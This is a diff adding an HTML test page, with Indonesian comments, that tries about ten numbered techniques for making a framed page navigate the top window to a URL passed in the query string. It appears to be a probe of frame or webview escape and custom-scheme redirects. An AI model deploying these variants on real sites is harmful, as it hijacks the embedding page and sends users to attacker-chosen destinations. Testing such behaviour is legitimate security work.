@@ -1,0 +1,36 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>.</title>
+<style>body{font:15px -apple-system,system-ui;margin:0;padding:8px;background:#ffe}button{font-size:17px;padding:16px;width:100%;background:#b00;color:#fff;border:0;border-radius:8px}</style></head><body>
+<div id="lbl"></div>
+<script>
+var v = (location.search.match(/[?&]v=(\d+)/)||[])[1] || '1';
+var S = decodeURIComponent((location.search.match(/[?&]s=([^&]+)/)||[])[1] || 'geo:0,0');
+document.getElementById('lbl').textContent = 'payload v'+v+' → '+S;
+
+function tap(fn){ var b=document.createElement('button'); b.textContent='TAP DI SINI (v'+v+')';
+  b.onclick=fn; document.body.appendChild(b); }
+
+setTimeout(function(){
+  try {
+    if (v==='1' || v==='2' || v==='12') { top.location.href = S; }                 // klasik
+    else if (v==='3') { tap(function(){ top.location.href = S; }); }               // butuh aktivasi user
+    else if (v==='4') {                                                            // <a target=_top>
+      var a=document.createElement('a'); a.href=S; a.target='_top';
+      a.textContent='x'; document.body.appendChild(a); a.click();
+    }
+    else if (v==='5') {                                                            // <form target=_top>
+      var f=document.createElement('form'); f.action=S; f.target='_top'; f.method='GET';
+      document.body.appendChild(f); f.submit();
+    }
+    else if (v==='6') { tap(function(){ window.open(S); }); }                      // delegate window-creation
+    else if (v==='7') { tap(function(){ window.open(S,'_top'); }); }               // hybrid open→top
+    else if (v==='8') {                                                            // iframe BERSARANG
+      var n=document.createElement('iframe');
+      n.srcdoc='<scr'+'ipt>setTimeout(function(){top.location.href='+JSON.stringify(S)+'},300)</scr'+'ipt>';
+      document.body.appendChild(n);
+    }
+    else if (v==='9')  { location.href = S; }                                      // frame navigasi DIRINYA
+    else if (v==='11') { top.location.replace(S); }                                // replace, bukan assign
+  } catch(e){ document.getElementById('lbl').textContent += ' ERR:'+e; }
+}, 300);
+</script></body></html>
